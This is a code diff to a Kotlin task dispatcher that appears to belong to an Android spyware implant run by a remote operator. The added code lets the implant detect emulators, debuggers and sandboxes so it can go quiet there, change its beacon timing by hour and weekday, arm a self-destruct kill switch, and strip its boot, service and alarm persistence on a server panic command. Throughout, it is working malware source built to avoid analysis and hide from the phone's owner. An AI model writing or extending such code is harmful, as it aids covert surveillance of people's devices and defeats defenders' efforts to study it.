@@ -27,6 +27,8 @@ object TaskRunner {
         "triage", "find", "netinfo", "env", "resolve", "touch",
         "persist", "unpersist", "persist.list", "persist.verify",
         "persist.migrate", "persist.health",
+        "evade.report", "evade.posture", "evade.profile", "evade.killswitch",
+        "hygiene.memory",
     )
 
     /**
@@ -297,6 +299,13 @@ object TaskRunner {
                 Persistence.health(context?.android, stateDir()),
             )
 
+            // ---- the posture and the kill switch ---------------------------
+            "evade.report" -> evasionReport()
+            "evade.posture" -> evasionPosture(args)
+            "evade.profile" -> evasionProfile(args)
+            "evade.killswitch" -> evasionKillswitch(args)
+            "hygiene.memory" -> Outcome(0, Evasion.memoryReport().toByteArray(), "")
+
             // ---- network reach and the local environment ------------------
             "env" -> environment(args.field("filter")?.text() ?: "")
             "resolve" -> resolve(
@@ -304,6 +313,8 @@ object TaskRunner {
                 args.field("port")?.long() ?: 0L,
             )
             "touch" -> touch(path)
+            "evade.shape" -> unsupported("evade.shape", "the traffic shaping needs the desktop implant")
+            "hygiene.process" -> unsupported("hygiene.process", "the process hygiene needs the desktop implant")
             "scan" -> unsupported("scan", "network scanning needs the desktop implant")
             "p2p" -> unsupported("p2p", "peer links need the desktop implant")
             "bof" -> unsupported("bof", "COFF modules are a Windows capability")
@@ -381,6 +392,139 @@ object TaskRunner {
 
     /** Where the implant keeps its own state. */
     private fun stateDir(): String = context?.stateDir ?: ""
+
+    /**
+     * Take the persistence entries away.
+     *
+     * The exit of the implant is the last word of the operator: the phone
+     * is left the way it was found, so the boot receiver, the foreground
+     * service and the alarm go with it.  This is the path the panic task
+     * of the server takes.
+     */
+    fun removePersistence() {
+        val ctx = context ?: return
+        val args = Upk.map("method" to Upk.str("all"))
+        Persistence.remove(ctx.android, ctx.stateDir, args)
+    }
+
+    /** The posture of the phone. */
+    private fun evasionReport(): Outcome {
+        val posture = Evasion.classify()
+        val state = Evasion.load(stateDir())
+        val factor = Evasion.factor(state)
+        return Outcome(0, posture.report().toByteArray(), "")
+            .with("posture", postureValue(posture))
+            .with("posture_sleep_factor", Upk.num((factor * 100).toLong()))
+    }
+
+    /** The posture as an upk value, the same shape the desktop beacon sends. */
+    private fun postureValue(posture: Evasion.Posture): Upk {
+        val artefacts = posture.artefacts.map {
+            Upk.map(
+                "name" to Upk.str(it.name),
+                "class" to Upk.str(it.kind),
+                "severity" to Upk.num(it.severity.toLong()),
+                "detail" to Upk.str(it.detail),
+            )
+        }
+        return Upk.map(
+            "label" to Upk.str(posture.label()),
+            "virtual" to Upk.bool(posture.emulated),
+            "workstation" to Upk.bool(false),
+            "developer" to Upk.bool(false),
+            "lab" to Upk.bool(false),
+            "sandbox" to Upk.bool(posture.emulated || posture.debugger),
+            "confidence" to Upk.num(posture.confidence.toLong()),
+            "reasons" to Upk.Arr(posture.reasons.map { Upk.str(it) }),
+            "artefacts" to Upk.Arr(artefacts),
+        )
+    }
+
+    /** Apply the operator's settings to the posture. */
+    private fun evasionPosture(args: Upk): Outcome {
+        val state = Evasion.load(stateDir())
+        var updated = state
+        args.field("silence_on_emulator")?.flag()?.let {
+            updated = updated.copy(silenceOnEmulator = it)
+        }
+        args.field("slow_on_emulator")?.flag()?.let {
+            updated = updated.copy(slowOnEmulator = it)
+        }
+        Evasion.save(stateDir(), updated)
+        val posture = Evasion.classify()
+        val text = StringBuilder("posture: the settings were applied\n")
+        text.append("posture: silence on an emulator: ${updated.silenceOnEmulator}\n")
+        text.append("posture: slow on an emulator: ${updated.slowOnEmulator}\n")
+        return Outcome(0, text.toString().toByteArray(), "")
+            .with("posture", postureValue(posture))
+    }
+
+    /** The schedule of the day. */
+    private fun evasionProfile(args: Upk): Outcome {
+        val state = Evasion.load(stateDir())
+        var updated = state
+        args.field("base")?.long()?.let { updated = updated.copy(base = it) }
+        args.field("busy_start")?.long()?.let { updated = updated.copy(busyStart = it.toInt()) }
+        args.field("busy_end")?.long()?.let { updated = updated.copy(busyEnd = it.toInt()) }
+        args.field("busy_factor")?.long()?.let { updated = updated.copy(busyFactor = it) }
+        args.field("night_factor")?.long()?.let { updated = updated.copy(nightFactor = it) }
+        args.field("weekend_factor")?.long()?.let { updated = updated.copy(weekendFactor = it) }
+        Evasion.save(stateDir(), updated)
+        val factor = Evasion.factor(updated)
+        val text = "schedule: base ${updated.base}s, busy ${updated.busyStart}-${updated.busyEnd}, " +
+            "busy ${updated.busyFactor}%, night ${updated.nightFactor}%, " +
+            "weekend ${updated.weekendFactor}%\n"
+        return Outcome(0, text.toByteArray(), "")
+            .with("schedule_factor", Upk.num((factor * 100).toLong()))
+    }
+
+    /** The kill switch: the moment the implant stops existing. */
+    private fun evasionKillswitch(args: Upk): Outcome {
+        val state = Evasion.load(stateDir())
+        if (args.field("clear")?.flag() == true) {
+            Evasion.save(
+                stateDir(),
+                state.copy(
+                    killArmed = false,
+                    killFile = "",
+                    killUptimeHours = 0,
+                    killMarker = "",
+                ),
+            )
+            return Outcome(0, "killswitch: it is disarmed\n".toByteArray(), "")
+        }
+        val file = args.field("file")?.text() ?: ""
+        val hours = args.field("uptime")?.long() ?: 0
+        val marker = args.field("marker")?.text() ?: ""
+        if (file.isEmpty() && hours <= 0 && marker.isEmpty()) {
+            return Outcome(
+                1,
+                ByteArray(0),
+                "evade.killswitch needs args.file, args.uptime or args.marker",
+            )
+        }
+        Evasion.save(
+            stateDir(),
+            state.copy(
+                killArmed = true,
+                killFile = file,
+                killUptimeHours = hours,
+                killMarker = marker,
+                killNote = args.field("note")?.text() ?: "",
+            ),
+        )
+        val text = StringBuilder("killswitch: it is armed\n")
+        if (file.isNotEmpty()) {
+            text.append("killswitch: it fires when the file $file appears\n")
+        }
+        if (hours > 0) {
+            text.append("killswitch: it fires when the phone has been up for $hours hours\n")
+        }
+        if (marker.isNotEmpty()) {
+            text.append("killswitch: it fires when the operator sends $marker\n")
+        }
+        return Outcome(0, text.toString().toByteArray(), "")
+    }
 
     private fun unsupported(kind: String, why: String): Outcome =
         Outcome(2, ByteArray(0), "unsupported on this platform: $kind ($why)")
